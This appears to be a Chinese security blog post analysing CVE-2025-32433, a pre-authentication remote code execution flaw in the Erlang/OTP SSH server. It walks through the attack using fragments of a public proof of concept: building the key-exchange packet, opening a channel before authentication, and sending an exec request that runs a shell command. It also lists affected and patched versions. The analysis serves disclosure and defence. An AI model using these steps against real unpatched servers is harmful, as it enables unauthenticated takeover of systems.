#  CVE-2025-32433：Erlang/OTP SSH 服务器中的预授权 RCE  
 Ots安全   2025-06-28 11:59  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
网址  
- https://nvd.nist.gov/vuln/detail/CVE-2025-32433  
  
- https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce  
  
目标  
- OTP 25 ≤ 25.3.2.19  
  
- OTP 26 ≤ 26.2.5.10  
  
- OTP 27 ≤ 27.3.2  
  
解释  
  
Erlang OTP 是开放电信平台 (Open Telecom Platform) 的缩写。它是一个提供各种功能的平台，可高效开发基于 Erlang 的实时服务器或消息传递系统。  
  
该漏洞是 Erlang/OTP 的 SSH 服务器模块中的一个预授权 RCE（远程代码执行）漏洞，通过在身份验证过程之前错误地处理 SSH 消息，允许在无需身份验证的情况下远程执行任意代码。  
  
此漏洞允许攻击者在 SSH 连接期间发送未经身份验证的消息SSH_MSG-CHANNEL_OPEN（消息编号 90）和（消息编号 98），而这些消息应该在身份验证后发送。这些消息用于在用户完成身份验证后打开会话通道，并在通过打开的通道请求命令等时使用。SSH_MSG_CHANNEL_REQUESTSSH_MSG-CHANNEL_OPENSSH_MSG_CHANNEL_REQUEST  
  
根据SSH 协议规范 ( RFC 4254 )，这些消息应仅在身份验证后才被接受，并且任何提前发送的消息都应被视为会话终止。然而，在存在漏洞的 Erlang/OTP 版本中，SSH 守护进程并未强制执行此规则，这导致攻击者无需身份验证即可打开会话通道并发送 exec 请求。  
  
攻击流程  
  
以下是基于公开的PoC代码模拟的攻击流程。  
  
当客户端和服务器启动 SSH 会话时，它们会相互交换版本信息以验证协议兼容性。例如，客户端与服务器交换字符串 SSH-2.0-OpenSSH_8.9。  
  
```
s.sendall(b"SSH-2.0-OpenSSH_8.9\r\n")banner = s.recv(1024)
```  
  
  
客户端（攻击者）通过发送 SSH_MSG_KEXINIT 数据包来启动密钥交换过程。此消息包含密钥交换方法、加密算法、压缩选项等列表。  
  
```
defbuild_kexinit():    cookie = b"\x00" * 16    defname_list(l):        return string_payload(",".join(l))    # Match server-supported algorithms from the log    return (        b"\x14"        + cookie        + name_list(            [                "curve25519-sha256",                "ecdh-sha2-nistp256",                "diffie-hellman-group-exchange-sha256",                "diffie-hellman-group14-sha256",            ]        ) # kex algorithms        + name_list(["rsa-sha2-256", "rsa-sha2-512"]) # host key algorithms        + name_list(["aes128-ctr"]) * 2# encryption client->server, server->client        + name_list(["hmac-sha1"]) * 2# MAC algorithms        + name_list(["none"]) * 2# compression        + name_list([]) * 2# languages        + b"\x00"        + struct.pack(">I", 0) # first_kex_packet_follows, reserved    )     ...kex_packet = build_kexinit()s.sendall(pad_packet(kex_packet))
```  
  
  
在初始密钥交换之后，攻击者通过 SSH_MSG_CHANNEL_OPEN 消息请求创建会话通道。通常，只有在用户身份验证完成后才可以发出此请求。  
  
```
defbuild_channel_open(channel_id=0):    return (        b"\x5a"  # SSH_MSG_CHANNEL_OPEN        + string_payload("session")        + struct.pack(">I", channel_id) # sender channel ID        + struct.pack(">I", 0x68000) # initial window size        + struct.pack(">I", 0x10000) # max packet size    )...chan_open = build_channel_open()s.sendall(pad_packet(chan_open))
```  
  
  
然而，由于CVE-2025-32433漏洞，服务器无需身份验证即可接受此请求，因此攻击者即使没有身份验证也可以打开通道。  
  
攻击者发送 SSH_MSG_CHANNEL_REQUEST 消息，请求通过开放通道执行命令。此消息通常用于在经过身份验证的会话中执行命令。  
  
```
chan_req = build_channel_request(    command='os:cmd("touch /tmp/test").')s.sendall(pad_packet(chan_req))
```  
  
  
该漏洞允许未经身份验证的消息被接受。因此，包含“exec”有效负载的请求可能会被接受，从而允许攻击者远程执行任意shell命令。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafvy4MsdawXz4pQq3r4pg4rdYeMaJkqH8ICxHtvTriaCFoJlaH68CoDs2psLgqDTNBI2wv0kIibrXpw/640?wx_fmt=png&from=appmsg "")  
  
此漏洞已在 OTP 版本 27.3.3、26.2.5.11、25.3.2.20 及更高版本中修补。  
  
参考  
  
https://www.sonicwall.com/blog/pre-auth-rce-alert-critical-ssh-flaw-in-erlang-otp-cve-2025-32433-  
  
https://github.com/ProDefense/CVE-2025-32433  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
